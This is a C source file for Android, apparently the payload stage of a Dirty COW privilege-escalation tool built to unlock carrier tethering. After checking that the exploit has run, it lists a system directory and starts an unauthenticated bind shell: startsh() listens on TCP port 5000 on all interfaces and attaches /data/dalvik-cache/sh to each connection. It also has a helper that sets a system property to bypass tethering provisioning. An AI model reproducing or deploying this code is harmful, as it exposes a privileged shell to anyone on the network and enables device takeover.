#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
//#include "lsh.h"



#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define BLOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "fixtc"

#include "psutils.h"
#include "dirtycow.h"
#define TMPFILE "/data/local/tmp/asdfasdf"
#define OBJ1 "/data/data/com.android.systemui/files/boot.ad"
#define OBJ2 "/data/data/com.android.systemui/files/boot.ad.image"
#define DATADIR "/data/data/com.android.systemui/files"
#define MAX_WAIT 70
#define PROP "net.tethering.noprovisioning"
#define APPPROC_OLD "/data/data/com.example.marto.tether/files/app_process32old"
#define NEWSHELL "/data/dalvik-cache/sh"

int check_context(const char* conn2) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                ALOG("Current Context: %s",conn);
                return (int)(strcmp(conn2,conn) == 0);
            }
        }
    }
    return 0;
}

int remove_fn(const char* fn) {
    int res = remove(fn);
    if (res != -1) {
        ALOG("[pass] REMOVED FILE");
        return 0;
    }
    ALOG("[erro] CAN'T REMOVE FILE %s",fn);
    return 2;
}

int checkdir(const char* d) {
    DIR *dp;
    dp = opendir(d);
    if (dp == NULL) {
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    struct stat st;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            char* fullpath = 0;
            asprintf(&fullpath,"%s/%s",d,ep->d_name);
            if(fullpath) {
                stat(fullpath,&st);
                ALOG("\t%5d:%5d\t%s", st.st_uid, st.st_gid, fullpath);
            } else {
                ALOG("\tXXXXX:XXXXX\t%s", fullpath);
            }

            if (fullpath) {
                free(fullpath);
            }
        }
        closedir(dp);
    } else {
        ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}

void setnetprop() {
    if(property_set(PROP, "true")) {
        ALOG("NOOOOOOOOOOOOOOOOOOOO: could not set property: " PROP);
    }
    return;
}

int startsh() {
    int listenfd = 0, connfd = 0;
  struct sockaddr_in serv_addr; 
  pid_t cpid;

  char sendBuff[1025];
  char command[] = NEWSHELL;
  char * args[] = {NEWSHELL, NULL};
  time_t ticks; 

  listenfd = socket(AF_INET, SOCK_STREAM, 0);
  memset(&serv_addr, '0', sizeof(serv_addr));
  memset(sendBuff, '0', sizeof(sendBuff)); 

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(5000); 

  bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 

  listen(listenfd, 10); 

  while(1)
    {
      connfd = accept(listenfd, (struct sockaddr*)NULL, NULL); 

      cpid = fork();
      if (cpid < 0) exit(1);
      if (cpid) {
	close(connfd);
	//	waitpid( cpid, NULL, 0 ); /* wait for and reap child process */
      } else {
	/* In the child process: */
	dup2( connfd, STDIN_FILENO );  /* duplicate socket on stdout */
	dup2( connfd, STDOUT_FILENO );  /* duplicate socket on stdout */
	dup2( connfd, STDERR_FILENO );  /* duplicate socket on stderr too */
	close( connfd );  /* can close the original after it's duplicated */
	execvp( command, args );   /* execvp() the command */
	ALOG("Exec failed\n");
      }
    }
}
int main(int argc, char** argv) {
    int rc; //return code
    rc = check_for_dirtycow();
    if(!rc) {
        ALOG("[wait] Dirty Cow is running!");
        return 2;
    }

    ALOG("now free to run set prop in the correct context!");
    ALOG("uid %d\n", getuid());


    logdir("/data/dalvik-cache");
    // sleep forever
    startsh();
    
    ALOG("###################DONE WITH TC#aaaaaa####################");
    return 0;
}
